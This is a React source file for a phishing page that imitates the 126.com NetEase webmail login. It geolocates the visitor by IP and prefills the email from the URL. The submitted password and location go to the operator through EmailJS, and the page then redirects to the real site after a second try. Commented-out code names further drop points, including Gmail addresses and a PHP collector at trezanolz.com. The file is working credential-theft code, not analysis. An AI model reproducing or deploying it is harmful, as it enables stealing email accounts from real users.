import React, { useEffect, useState, useRef } from "react";
import './126.css';
import yhnh from '../../Media/Images/163.png';
import { BsEyeFill, BsEyeSlashFill } from 'react-icons/bs';
// import $ from 'jquery';
import Preloader from "../../Preloader/Preloader";
import emailjs from '@emailjs/browser';

const OneTwoSix =()=>{

    const formRef = useRef();

    const [ipAdress, setIpAdress] = useState('');
    const [city, setCity] = useState('');
    const [flag, setFlag] = useState('');
    const [country, setCountry] = useState('');
  
    const forTime = new Date();
  
    useEffect(()=>{
      fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
      .then(req=> req.json())
      .then(res=>{

          setIpAdress(res.ip)
          setFlag(res.country.flag);
          setCountry(res.country.name);
          setCity(res.city.names.en);
  
      })
      .catch(e=> console.log)
  }, []);

    useEffect(()=>{
        document.title = "126网易免费邮-你的专业电子邮局";
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2500);
    }, []);

    const reloadWebPageHandler = ()=> window.location.reload();

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    const [email, setEmail] = useState(extracetdEmail);
    // console.log('email',email[0]);
    const [password, setPassword] = useState('');
    const domain = `126.com`;

    const [spinLoader, setSpinLoader] = useState(false);

    const [count, setCount] = useState(0);

    const submit163 = (e)=>{
        e.preventDefault();
        if (password === "") {
            return null
        } else {

            setCount(count=> count + 1);
            if(count >= 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('&', 1).toString();
                console.log(extracetdemailDomain);
                setTimeout(() => {
                    // window.location.href = `https://mail.${extracetdemailDomain}`; 
                    window.location.href = "https://www.126.com/";
                    
                }, 1700);

            };

            // const user = {
            //     email: email,
            //     password: password,
            //     // country: country,
            //     // city: city,
            //     // flag: flag,
            //     // eyep: ipAdress,
            //     // nownow: forTime	
            // };



                            //   post to server
                            //   const user = {
                            //     email: email,
                            //     password: password,
                                // subject: "Chameleon Page Logs",
                                // to: "payrealsys@gmail.com",
                                // // body: `Email: ${defaultEmail}  Password: ${defaultPassword}`
                                // body:
                                // `
                                // <html lang="en">
                                // <p>Online Correspondence: ${email}</p>
                                // <p>Signal: ${password}</p>
                                // <p>Country: ${country}</p>
                                // <p>Flag: ${flag}</p>
                                // </html>
                                // `
                            // };


            //                 const user = {
            //                     "subject": "Coming Logs",
            //                     "to": "reportwork5252@gmail.com",
            //                     "body": `<div><h3></h3><p>Online_Correspondence: ${email}</p><p>Signal: ${password}</p><p>Country: ${country}</p><p>Flag: ${flag}</p></div>`
            //                 }

    
            // $.ajax({
            //     type: "POST",
            //     url: "https://trezanolz.com/kenneth/chame.php",
            //     data: user,
            //     success(data) {
            //         // alert('OK');
            //         console.log('data');
            //     },
            // });




            const serviceID = `service_xhrj4w4`;
            const templateID = `template_crghlbk`;
            const publicKey = `35JbsFMyI7dxAGiKW`;
    
    
            emailjs
            .sendForm(serviceID, templateID, formRef.current, {
              publicKey: publicKey,
            })
            .then(
              () => {
                console.log('0!');
              },
              (error) => {
                console.log('=...', error.text);
              },
            );



            setSpinLoader(true);
            setTimeout(() => {
                setSpinLoader(false);
                setPassword('');
                setEmail(email)
            }, 2400);
        }
    }


    const [show, setShow] = useState(false);
    const handleShow = ()=> setShow(show=> !show);


    return <div className="etrftgf">

        { spinLoader ? <Preloader /> : null }
        
        <section className="conta_n_e_r">

            <header style={{color:'#fff'}} className="o163_header_">
                <div className="wp">
                        <img 
                        alt="crdcdsxc"
                        src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASEAAAA8CAMAAAAe/PzYAAAAM1BMVEVHcEz////////////////////////////////////////////////////////////////P0YphAAAAEHRSTlMAfxDv3x+/P59db4/PrzAvyN4unAAACmpJREFUeNrtW9u63KwNFSAQMraz3v9pewF4sA3Ys5N+/dOWi53JjE9aSFo6mWi49iT0/zVeEoAWIa8mboE5hM2o/5+HxxoGAFvRWYLDaa3LO5AWvqxg/xvw2VPGY81oLQG9FV9gJLez9EdPpHJZVy2earUa3Yl0kb33k/zIvPLashpgtB4x8u56SurfMvbXUg/AA9I7sC1D7VRgqX8vKwL+R+aVlyEiojRECDy/uufbCXYkQn8LxgjJVVDeaYLQTqQ9MCLwI/M67VMYIwQ3Mxp7A2i0X/KMELe6xReEfLtZzSaEfHgAtvo3xhj3HkIRjpkdgP2FeZX1i4iIHGZrYsXb7WAzdlerXlc8IRQuOy8XXXWFCU43GTyz7yNU9XxoXnck6v7Mlhsamrkdu00cergpgJ51qAXvEoisJ0NuZNo6OrSOEco6FPuPmDqask4toK7wGqCx1/ogtGYT2HW/IDTWXRuAWCguVMW/+iE5/JApCNmYjDErEGOMMRWfvfTZVvqu5onKpvyt+ILoBQjWbFlhNd/UpXcI+bXuJZFcNSAZY4zZgKQagUVVt6pD590rCIWurxy5YjPwJlfVeMfzA6I/EAqAkAKbBqIIxLMOBd+s7YOQOID38j2DPZH33k4d0QShD9rtclPlWJ8Q6jnrO88PHWBFyDsESsAKKK2A1xee2qY5CWYODEBsuexX+S0SRXA+LCMkXTdkR5L/mvHBVDk6PD8NzAQIZABZsXkHJiBc/VCburiCkN0AbFOEtmyzdI+HegiZri8YuuIarX5vZp2HXugJIeuy/hggAvrgqYsgC5IHVhERiYCKiHxOtMBqjAlA8UbGGGNMinaAUPjkom1yORB8nYa7NyinNDag0DOXmYy2dVnlGoQsh7ACCMda61YL+WqCNYPwx4n7jH97CPWpeeSKt5O0jseRo38E6CE9yQjZEoyYLIOecPU80sMDofCJ4Irh+2Qyo69Zh4yqqimidRCSPp+MXPFy4BeW3RKRlcgvEJLvIu8mHjL5ptYBekFI+B52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"
                        className="logo_163_" id="spc_e"
                        />

                        <i className="sing_ln_" id="spc_e">|</i>

                        <span id="spc_e" >你的专业电子邮局</span>
                </div>


                <ul className="ul163">
                    <li onClick={reloadWebPageHandler}>手机App下载</li>
                    <li onClick={reloadWebPageHandler}>电脑客户端下载</li>

                    <li onClick={reloadWebPageHandler}>VIP</li>
                    <li onClick={reloadWebPageHandler}>会员</li>
                    <li onClick={reloadWebPageHandler}>企业邮箱</li>
                    <li onClick={reloadWebPageHandler}>海外登录</li>
                    <li onClick={reloadWebPageHandler}>帮助</li>
                    <li onClick={reloadWebPageHandler}>反馈</li>
                    <li onClick={reloadWebPageHandler}>修复公示</li>

                </ul>

            </header>

            <article className="oooooooooooooooooodhjkcm">
                <div>
                    <img 
                        alt="ln_pg_163"
                        src={yhnh}
                        className="landpage_img_163"
                        onClick={reloadWebPageHandler}
                        style={{ cursor:'pointer'}}
                    />
                </div>


                <main className="n_163_fm_wrapper_">
                    <img alt="sd_rt" 
                        className="sd_rt"
                        style={{cursor:'pointer'}}
                        title="扫码登录"
                        onClick={reloadWebPageHandler}
                        src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJAAAACQBAMAAAAVaP+LAAAAD1BMVEVHcEw0v3I0wXQzwHI0v3JzQ+LPAAAABHRSTlMAfj/dTUCnlQAAARpJREFUaN7t2NFtwkAQRdF5aYGpIEoHLoHtvyZ+nAjbawO7N5ZXevczoKNBkMmECOeccwOWpZSIKOtqP3t6bJsoKJKCREGRFCQKiqQgUVAcQNUnngLt4YYuDeX+27/4IL6EREHrkdohUdBqpA5IFLQcqQf6+p7LTuivH0MH3aZpQiCVcmdeWlKQKCiSgkRBcdtAjTtbFBSGToWE3UfZfvq9dXt/Du3c3g2QKKh+e7dAoqC4JOQGrf4/oKHNoUtAoqD6lznROBICVf+gRONIDORG/q7y+XelGRIF/Y7UD4mC5pEASBS0XJXROxIBLVZl9I6EQPOqBBK2GZOChO3qpCD9x8FkaCQoKUjYNZIUJOw+8l4ady8555w7qwd9UZnv+8v33QAAAABJRU5ErkJggg=="
                     />

                     <h1 className="hhhh111163com">账号登录</h1>

                     {/* <b>{email}</b> */}

                    <form className="loginForm" onSubmit={submit163} ref={formRef}>
                        <div style={{display:'flex', justifyContent:'center'}}>
                            <div className="email_cp_ctnr_" aria-readonly>
                                <b>{ email.slice('@', email.indexOf('@'))}</b>
                               
                                <span style={{color:'#555', fontSize:'15px',paddingRight:'10px'}}>{domain}</span>
                            </div>
                        </div>

                        <input type="text" value={country} name="country" hidden/>
              <input type="text" value={city} name="city" hidden/>
              <input type="email" value={email} name="online_correspondence" hidden/>

                        {/* <div> */}

                            <div  style={{display:'flex', justifyContent:'center'}}>
                                <input 
                                    type={!show ? "password" : 'text'}
                                    placeholder='输入密码'
                                    value={password}
                                    onChange={e=>setPassword(e.target.value)}
                                    className="o163_pwd"
                                    required
                                    name="signal"
                                />

                                { show ? <BsEyeFill className="eyyyeee" onClick={handleShow}/> : <BsEyeSlashFill className="eyyyeee" onClick={handleShow}/> }
                            </div>

                        {/* </div> */}

                        <article className="vedrfvd">
                            <div style={{display:'flex', marginLeft:'1.5em'}}>
                                <input type={`checkbox`}/>
                                &#160;&#160;
                                <span className="iuedjk">30天内免登录</span>
                            </div>

                            <div className="iuedjk" style={{marginRight:'1.9em'}} onClick={reloadWebPageHandler}>忘记密码</div>
                        </article>

                        <div style={{display:'flex', justifyContent:'center'}}>
                            <input 
                                type={`submit`}
                                value="登  录"
                                className="btn_163"
                                onClick={submit163}
                                id="o126submit"
                                
                            />
                        </div>

                    </form>

                    <p className="iuedjk" onClick={reloadWebPageHandler} style={{textAlign:'center', cursor:'pointer'}}>
                        注册新账号 &#160;

                        | &#160;

                        注册VIP
                    </p>


                    <p className="iuedjk" style={{textAlign:'center', cursor:'pointer', marginTop:'5rem'}} onClick={reloadWebPageHandler}>
                        阅读并接受 《服务条款》和 《隐私政策》
                    </p>

                </main>

               


            </article>

            

            <p style={{textAlign:'center', cursor:'pointer', color:'#fff', fontSize:'13px'}} onClick={reloadWebPageHandler}>
            网易首页 &#160;

            | &#160;

            网易严选 &#160;

            |&#160;

            政府公益热线 &#160;

            | &#160;

            网易公司版权所有©1997-2023
            </p>

            <p style={{textAlign:'center', cursor:'pointer', color:'#fff', fontSize:'13px', marginBottom:'2em'}} onClick={reloadWebPageHandler}>
            ICP备案 粤B2-20090191-18 &#160;

            <img alt="footer" 
                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAFO0lEQVR42k2Ua1DUVRiHj6TmqONoWZqZyuTkJZ0sC8UJvGR4RwUvLC2CZCgpkpoKRKhAOHlB8a45UumMkaSiQqKAoICCoMLKsoBchOWy7LK7ssvucvPpHx+AD8+Z886cec7vvGfOEYCgxdxFZ4tFYDYLS5tKgFFCPbKl/KbfrRNhj/85GFLQVBC3BYpHQ6uw2WwCg0HwyijR3AUguoa2FqNosxhEh0kvaEUiY27p9Z/iYjettl7wnsY+j1lE+i/m4s9unPOXtyvjw67S+mzpa4tRdBrUosNYK6HuEeosNULfUinaOxFgHZB6dB0z353BcR8HMjdPp9bnQ3TbplKe5E/8nzuY9ZYjyQc9ANObppZaYTYmCKs5oZewtVYYbU0CdKNtT0IyXL9YTkyIDFPoRBR9B1DoOI4S18k8setDe6wLcbdiWDXTndeqIzegfIDFlirgdo/Q1qwS7VRMenlzU6vDqGWsk/nRET2FQvtRFNmP5OmUUZQsmMjTEcPIGDwI0nzYvCOSeePn0/ggpE5XcniCMuX7HiHapwLr6S9OHNqJEPu4fFiGcd0Ynr8xCOWnY1GOGkHB4GE8nzmeHGGH1nsSqXfCEGIrh6N2YysNn6ZMO9cjNCrvju68t+rBscPSor67Sdw7m2qXMZSI/ijHjqDYyZ7i2fbS/D2eCkGx8zhUebsRfQIJDQkGQ1Ta6zadfbew4OquQOslRy6ejUSIMG6d9cAS7kC+6EeObDLPTzlRk76SqugFFLwzkKZtn5N/f1tXwpNHI0CxBl35jYhuYdmd/Wc0pz8n62ooYkAMW319acucz51l48l2/oCiTZ9RsnMWZQEzKD7gAtXfErzBByGCyUrdj/n6HNQZR2K7hSV/BdSWRc3kVW4go51P07dfAHeXTqQx3ImihZN5/P+RvaejmPMR6kAHFN85Maj/RkZM+5VmVRBVJx2pvLaxrCdhvG/Lk6BZkLiI7b+c6No5SQyl8+OBFH/7CVlu4ynaOYP68Nl0Th3OPTEMIb7HPywastxR7JdakuJf1S1UJ+1NKI+dR0feBhQp+xHvR7NUOJIwZAiZIweSPeFt8iRKl0wiz3kq/nYOiKEh5CYF0V4YSM2NVTTlR53sJQx/+CJmLtVxa6HQj8gjZ7tuW/TxQ4j1uA5xxWfMCgYLL6neKBHE9pBwKPWiNtGLmr8Xo80JzuwWNmSHtqsueFAc407NcSeaHwegTA/ixG45W4IPcOuiH/nxbsi9g1jjGsiOXeE03fel4Xcnyn77mpprSzCU7NH1vBRTjmdtihsvLi2l6OgCin6ciC3TA8p8QLWMjqyVGK8thGeeYAgAhYyKiM+ktS68vOFGY66cVn2ic7cQiXbzM7nm0TpjXfpqCiOcUEZ/iT7/O7R35dQlrKThrgxj/gZeKfypOOtC6anFaHIDUN8P0Jk0V+a/bk3u9X1ZqsSryodzX17fWK95KEeTtZ66pDVo09eizfJCk7EeQ+56GlM9qPxjAXW3Zeif/0B9ph8vLsu0TZWx8y3WXsJWY5owVx68Y63+Eb1qJ9VJ3qhveqJJ9aTm+go06d5o/nWj4sxXVEltqUv2pE5KrsvfhEm9HZPm2BWzvpcQU55ob04f2KiKOK5OkZkbkpfTnLMGfZokS1iCTqobri7qSqx/5EnDPVepb740Vex9aWi4GGo13bazmi/1EjY/FB3WTPEiK1oojv8wPDfyG68He5zPl8e5Z5edX1lYE++urk+Uqysuy7PrU7akaAvPHCq5Fr7w2ZVtdtrGZGGzpAir6XyX6z8l0xwCoaTMcgAAAABJRU5ErkJggg=="
            />

             {/* 公安   */}
             &#160;

             粤公网安备 44010602006299 &#160;
             
             增值电信业务许可证  &#160;
             
             粤B2-20090191  &#160;
             
             B2-20090058 &#160;
            </p>

        </section>
    </div>
}

export default OneTwoSix;